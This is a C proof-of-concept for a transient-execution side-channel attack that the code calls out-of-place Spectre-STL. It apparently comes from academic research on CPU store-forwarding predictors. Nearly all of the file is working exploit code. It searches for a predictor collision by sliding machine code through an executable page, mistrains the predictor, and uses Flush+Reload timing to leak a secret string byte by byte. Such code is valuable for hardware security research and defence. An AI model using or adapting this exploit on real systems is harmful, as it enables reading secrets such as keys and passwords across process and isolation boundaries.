#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mman.h>

/* ======================= */
/*   PoC Configuration.    */
/* ======================= */

#include "config.h"

/* ======================= */
/*  Common address space.  */
/* ======================= */

// Variables that are used both in attacker and victim space.
uint8_t array1[64];
uint8_t array_padding[64];
long array2[256 * CACHE_ST] __attribute__ ((aligned (1024)));
size_t idx, padding_0;
uint8_t padding_1[64];
size_t idx_chain_0 = (size_t) &idx;
uint8_t padding_1[64];
size_t idx_chain_1 = (size_t) &idx_chain_0;
uint8_t padding_2[64];
size_t idx_chain_2 = (size_t) &idx_chain_1;

/* ======================= */
/*  Victim address space.  */
/* ======================= */

// For an avaliable load.
char* secret = SECRET;

// For an non-optimized load.
uint8_t temp = 0;

void victim_function(size_t x) {
    // Delayed store, cause a prediction of PSFP.
    array2[idx * CACHE_ST] = x;
    /* Three loads:
        1) load1 = array2[0];
        2) load2 = array1[load1];
        3) load3 = array2[load2 * CACHE_ST].
     */
	temp = array2[array1[array2[0]] * CACHE_ST];
}

/* ======================= */
/* Attacker address space. */
/* ======================= */

// Prime and probe function in the machine code format. This code is used during fiding the PSFP collision, and slides in an executable page. The instruction address of this function increases one byte for each round of collision finding.
uint8_t function_base[154] = {
    PRIME_PROBE_FUNC
};

// Length of the machine bytes.
int bytes_num_for_base = 154;

// The page where the prime and probe function will be placed.
static char* executable_page_1;

// The declaration of psfp_handler function. This is the entry of the prime and probe function that in the machine code format in line 56.
static void (*psfp_handler_entry) (void*, void*);

// Record execution time of the prime and probe function.
uint64_t timing[100];

/**
 *  Memory fence.
 */
__attribute__((always_inline)) inline void mfence() {
    __asm__ volatile("mfence" ::: "memory");
}

/**
 *  Instruction fence.
 */
__attribute__((always_inline)) inline void lfence() {
    __asm__ volatile("lfence" ::: "memory");
}

/**
 *  Flush a specific cache line by a given address.
 *  @param
 *      - addr: the virtual address that needs to be flushed
 */
__attribute__((always_inline)) inline void clflush(void* addr) {
    __asm__ volatile("clflush (%0)" :: "r"(addr));
}

/**
 *  Get a timestamp on the CPU that executes the code.
 *  @return
 *      - the 64-bit timestamp
 */
__attribute__((always_inline)) inline size_t gettime(void) {
    unsigned long low_a, high_a;
    asm volatile(RDPRU
        : "=a" (low_a), "=d" (high_a)
        : "c" (1));
    unsigned long aval = ((low_a) | (high_a) << 32);
    return aval;
}

/**
 *  Analyse a given time record, return the count of speculative store bypass state.
 *  @param
 *      - timing: timestamp records, in the form of an array
 *      - len: the length of timestamp array
 *  @return
 *      - the count of speculative store bypass state.
 */
int cnt_non_aliasing(uint64_t* timing, int len) {
    int cnt = 0;
    for(int i = 0; i < len; i ++)
        cnt += timing[i] <= TYPE_H_BOUND ? 1 : 0; 
    return cnt;
}

/** 
 *  Leak secrets through out-of-place Spectre-STL attack.
 *  We modify the code based on Spectre-V1 attack (https://github.com/Eugnis/spectre-attack).
 *  @param
 *      - malicious_x: the distance between secret byte and the base address of array1
 *      - value: record the recovered byte for each round of try, each element ranges from 0 to 255
 *      - score: count the recovered value for each round of try, each element ranges from 0 to TRY_FOR_LEAK
 **/
void leak(size_t malicious_x, uint8_t value[2], int score[2]) {
    // Temporal score board.
	static int results[256];
    // Store the timestamp.
	register uint64_t time1, time2;
    // For flush and reload.
    uint8_t junk = 0;
    volatile uint8_t* addr;
    // For score board evaluation.
    int rank_0_idx, rank_1_idx, mix_i;
    // Reset the score board.
	for (int i = 0; i < 256; i ++)
		results[i] = 0;
    // Leak secrets through out-of-place Spectre-STL attack.
	for (int tries = TRY_FOR_LEAK; tries > 0; tries--) {
        // Prepare for Flush+Reload.
 		for (int i = 0; i < 256; i ++)
			clflush(&array2[i * CACHE_ST]); 
        // Initialize PSFP to ensure PSFP hit for the victim load.
        // The sequence used here is (a 40n a 40 n a 40n).
		for (int i = 0; i < 3; i ++) {  
			(*psfp_handler_entry)(&array2[0], &array2[0]);
			for (int j = 0; j < 40; j ++) {
				mfence();
				(*psfp_handler_entry)(&array2[0], &array2[0] + 10);
			}
		}
        // Prime PSFP entry, and train it to predict as aliasing and predictive store forwarding.
        // The sequence used here is (5a).
        for (int i = 0; i <= 4; i ++) {  
            (*psfp_handler_entry)(&array2[0], &array2[0]);
            mfence();
        }
        // Prepare an non-aliasing store-load pair for attack.
		idx = 10;
		array2[0] = 0;
		temp = array2[0];
        // Delay the address generation of the store.
		clflush(&idx);
        // Wait for the cache flush.
		for (volatile int z = 0; z < 100; z ++) {}
        // Trigger a transient execution in the victim space.
        victim_function(malicious_x);
        // Reset PSFP for next round of leak.
        usleep(1);  
        // Perform Flush+Reload. We use Eugnis' code here.
		for (int i = 0; i < 256; i ++) {
			mix_i = ((i * 167) + 13) & 255;
			addr = (uint8_t*) &array2[mix_i * CACHE_ST];
			time1 = gettime();
            lfence();
			junk = *addr;
			lfence();
            time2 = gettime() - time1;
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != 0x0a && mix_i != 0x00)
				results[mix_i] ++;
		}
        // Evaluate the score board, and perform an early-stop algorithm.
        rank_0_idx = -1, rank_1_idx = -1;
        for (int i = 0; i < 256; i ++) {
            if (rank_0_idx < 0 || results[i] >= results[rank_0_idx]) {
                rank_1_idx = rank_0_idx;
                rank_0_idx = i;
            }
            else if (rank_1_idx < 0 || results[i] >= results[rank_1_idx]) {
                rank_1_idx = i;
            }
        }
        if (results[rank_0_idx] >= (2 * results[rank_1_idx] + 5) || (results[rank_0_idx] == 3 && results[rank_1_idx] == 0))
            break;
	}
    // The first and second best recoverd secret bytes.
	value[0] = (uint8_t)rank_0_idx;
	score[0] = results[rank_0_idx];
	value[1] = (uint8_t)rank_1_idx;
	score[1] = results[rank_1_idx];    
}

/** 
 *  Search for collision based on our reverse engineering of PSFP.
 *  The prime and probe function slides in executable_page_1. We want the store-load pair inside the prime and probe function collides with the store-load pair in the victim function. 
 *  In specific, the hashed values of the physical address of the two store-load pairs are the same. 
 *  Since the address mapping is not available in user mode, we have to move the prime and probe function to change the physical address of the candidate store-load pair.
 *  @param
 *      - executable_page: address of the empty page where the prime and probe function will be placed.
 *  @return
 *      - if the collision is found, return the offset of the entry to the start of executable_page; if not, return -1
 */
int search_for_collision(char* executable_page) {
    // Two variables that store the timestamp.
    uint64_t time1, time2;
    // Entry of the prime and probe function, whose address is alterable.
    static void (*entry) (void*, void*);
    // The memory access sequence (7n a 7n a 7n a 4a n 4a n 3a) that modifies the state of PSFP and SSBP.
    // 0 means non-aliased store-load pair(n), where the store and load target to different memory addresses; 
    // 1 means aliasd store-load pair(a), where the store and load target to the same memory address.
    // After executing the sequence, the main counter of PSFP will be set to 5, while the main counter of SSBP will be set to 0.
    int initialize_ops[38] = {0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1};
    int len_initialize_ops = 38;
    // Execute the collision finding algorithm.
    for (int i = EXE_PAGE_SIZE - bytes_num_for_base; i >= 0; i --) {
        // Step 1. Slide the prime and probe function to a new address.
        // Step 1.1. Set the new entry of prime and probe function.
        char* page_in_bytes = executable_page + i;
        printf("try offset: %-8d\r", i);
        fflush(stdout);
        // Step 1.2. Fill the machine code to a specific address. Note that the IVAs and IPAs of the store and load are adjustable.
        if (mprotect(executable_page, EXE_PAGE_SIZE, PROT_READ | PROT_WRITE) != 0)
            return -1;
        for (int i = 0; i < bytes_num_for_base; i ++)
            *(page_in_bytes + i) = function_base[i]; 
        if (mprotect(executable_page, EXE_PAGE_SIZE, PROT_READ | PROT_EXEC) != 0)
            return -1;
        // Step 1.3. Make the function callable.
        entry = (void*) page_in_bytes;
        // Step 2. Test whether the collision happens. Try TRY_FOR_COLLISION times for each possible address.
        int success_1 = 0, success_2 = 0;
        for (int try = 0; try < TRY_FOR_COLLISION; try ++) {
            // Step 2.1. Execute the pre-defined memory access sequence in the victim space.
            // The PSFP and SSBP entries that the victim store-load pair choose are initialized.
            // PSFP now predicts the victim store-load pair as aliasing (a).
            for (int j = 0; j < len_initialize_ops; j ++) {
                idx = initialize_ops[j] == 1 ? 0 : 1;
                clflush(&idx);
                mfence();
                victim_function(10);
            }
            // Step 2. For the odd round, the PSFP entry is reset to reduce the noise.
            // After execution the sequence below (40n), PSFP now predicts the pair as non-aliasing (n).
            if ((try & 1)) {
                for (int j = 0; j < 40; j ++) {
                    idx = 1;
                    clflush(&idx);
                    mfence();
                    victim_function(10);
                }
            }
            // Step 3. Execute the candidate prime and probe funcion and timing the function.
            // Step 3.1. Execute the memory access sequence below (35n).
            for(int j = 0; j < 35; j ++) {  // probe the SSBP
                mfence();
                time1 = gettime(); // read timer
                (*entry)(&array2[0], &array2[1]);  
                mfence();
                time2 = gettime() - time1; // read timer & compute the elapse time
                mfence();
                timing[j] = time2;
            }
            // Step 3.2. Count the frequency of non-alised execution time.
            // The non-alised execution time is shorter than the aliased one, and we use TYPE_H_BOUND to distinguish them.
            int cnt_h = cnt_non_aliasing(timing, 35);
            // Step 3.3. For the odd round, the frequency should range from [29, 32] when the collision happens.
            success_1 += (try & 1) && cnt_h >= 29 && cnt_h <= 32 ? 1 : 0;
            // Step 3.4. For the even round, the frequency should range from [3, 5] when the collision happens.
            success_2 += !(try & 1) && cnt_h >= 3 && cnt_h <= 5 ? 1 : 0;
        }
        // Step 4. Determine whether a collision occurs.
        // The judging threshold of success rate is 40% for the odd round and 60% for the even round.
        // Step 4.1. Find the collision and return the entry address (in the form of the offset from executable_page).
        if (success_1 >= TRY_FOR_COLLISION * 0.2 && success_2 >= TRY_FOR_COLLISION * 0.3) {
            printf("Find collision offset as %d\n", i);
            return i;
        }
        // Step 4.2. The collision does not occur, continue.
        continue;
    }
    // If the collision cannot be found, return -1.
    printf("Cannot find target.\n");
    return -1;
}

int main() {
    // Create plenty of pages to find the collision of PSFP.
    // Page number can be adjusted by modifying the macro PG_NUM.
    executable_page_1 = mmap(0, EXE_PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    // Create address mapping for executable_page_1.
    for (int i = 0; i < EXE_PAGE_SIZE; i ++)
        executable_page_1[i] ^= temp;

    // Create address mapping for array2.
	for (size_t i = 0; i < 256 * CACHE_ST; i ++)
		array2[i] = 0;

    // Initialize the values for the collision finding algorithm.
    array2[0] = 0;
    array1[10] = 10;
    array1[0] = 10;

    // Search PSFP collision address.
    printf("Search offset of prime entry:\n");
    int psfp_handler_entry_offset = search_for_collision(executable_page_1);

    // Check search result.
    if (psfp_handler_entry_offset == -1) {
        printf("Cannot find prime entry, please try again.\n");
        return 0;
    }
    psfp_handler_entry = (void*) executable_page_1 + psfp_handler_entry_offset;

    // Leak Secret through out-of-place Spectre-STL Attack, the framework is adapted from Eugnis' code.
	printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
	size_t malicious_x = (size_t)(secret - (char *)array1), secret_base = (size_t)(secret);
	int score[2], len = LEAK_LEN;
	uint8_t value[2];
    printf("Reading %d bytes:\n", len);
	while (-- len >= 0) {
		printf("Reading at address = 0x%lx... ", secret_base ++);
		leak(malicious_x ++, value, score);
		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
		printf("0x%02X='%c' score=%d ", value[0],
		       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X='%c' score=%d)", value[1],
				   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
				   score[1]);
		printf("\n");
	}
	return (0);
}